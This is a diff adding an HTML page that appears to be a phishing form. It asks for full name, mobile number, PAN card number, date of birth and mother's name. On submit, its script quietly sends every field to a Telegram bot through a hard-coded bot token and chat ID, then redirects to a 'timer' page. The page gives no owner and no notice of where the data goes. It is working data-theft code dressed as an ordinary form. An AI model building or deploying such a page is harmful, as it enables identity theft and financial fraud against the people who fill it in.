@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form Input</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            padding: 0px;
+        }
+        
+        #infoForm {
+            max-width: 400px;
+            margin: 0 auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        input[type="text"], input[type="date"] {
+            width: calc(100% - 10px);
+            padding: 10px;
+            border: 1.01px solid black;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #0056b3;
+        }
+
+        .error {
+            color: red;
+            font-size: 0.9em;
+        }
+  
+    </style>
+<img src="logo.jpg" alt="Logo" width="100%" height="70">
+
+</head>
+<body>
+  
+ <form id="infoForm" onsubmit="return submitForm()">
+    <div class="form-group">
+        <label for="fullName">Full Name:</label>
+        <input type="text" id="fullName" name="fullName" required>
+    </div>
+    <div class="form-group">
+        <label for="mobileNo">Mobile No.:</label>
+        <input type="text" id="mobileNo" name="mobileNo" required>
+    </div>
+    <div class="form-group">
+        <label for="panCardNo">PAN Card No.:</label>
+        <input type="text" id="panCardNo" name="panCardNo" required oninput="formatPanCard()">
+        <div id="panError" class="error"></div>
+    </div>
+
+    <div class="form-group">
+        <label for="dob">Date of Birth:</label>
+        <input type="text" id="dob" name="dob" required oninput="formatDOB()">
+        <div id="dobError" class="error"></div>
+    </div>
+    <div class="form-group">
+        <label for="motherOrWife">Mother Name:</label>
+        <input type="text" id="motherOrWife" name="motherOrWife" required>
+    </div>
+    <input type="submit" value="Submit">
+</form>
+<img src="footer2.jpg" alt="Logo" width="380" height="300">
+
+<script>
+    function formatPanCard() {
+        const panInput = document.getElementById('panCardNo');
+        const panError = document.getElementById('panError');
+        panInput.value = panInput.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+        if (!/^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(panInput.value)) {
+            panError.textContent = "Invalid PAN Card Format";
+        } else {
+            panError.textContent = "";
+        }
+    }
+
+    function formatDOB() {
+        const dobInput = document.getElementById('dob');
+        const dobLength = dobInput.value.length;
+        
+        if (dobLength === 2 || dobLength === 5) {
+            dobInput.value += '/';
+        }
+
+        // Automatically remove slashes if user deletes a character
+        if (dobLength > 10) {
+            dobInput.value = dobInput.value.slice(0, 10);
+        }
+    }
+
+    function submitForm() {
+        const fullName = document.getElementById('fullName').value;
+        const mobileNo = document.getElementById('mobileNo').value;
+        const panCardNo = document.getElementById('panCardNo').value;
+        const dob = document.getElementById('dob').value;
+        const motherOrWife = document.getElementById('motherOrWife').value;
+
+        // Validation for PAN Card and DOB before submission
+        if (document.getElementById('panError').textContent || document.getElementById('dobError').textContent) {
+            return false; // Prevent form submission if there are errors.
+        }
+
+        // Sending data to Telegram bot
+        const telegramBotToken = '7872970826:AAHImrH4mk8VU2v7OC_aFrE6uMpaoKj2d1k'; // Replace with your Telegram bot token
+        const chatId = '7652598056'; // Replace with your chat ID
+        const textMessage = `Full Name: ${fullName}\nMobile No: ${mobileNo}\nPAN Card No: ${panCardNo}\nDOB: ${dob}\nMother/Wife Name: ${motherOrWife}`;
+        
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textMessage)}`)
+            .then(response => {
+                if (response.ok) {
+                    // Redirect to another page after sending the message
+                    window.location.href = 'timer.html'; // Replace with your target URL
+                } else {
+                    alert('Failed to send data to Telegram.');
+                }
+            }).catch(error => {
+                alert('Error: ' + error);
+            });
+        
+        return false; // Prevent default form submission
+    }
+</script>
+
+</body>
+</html>
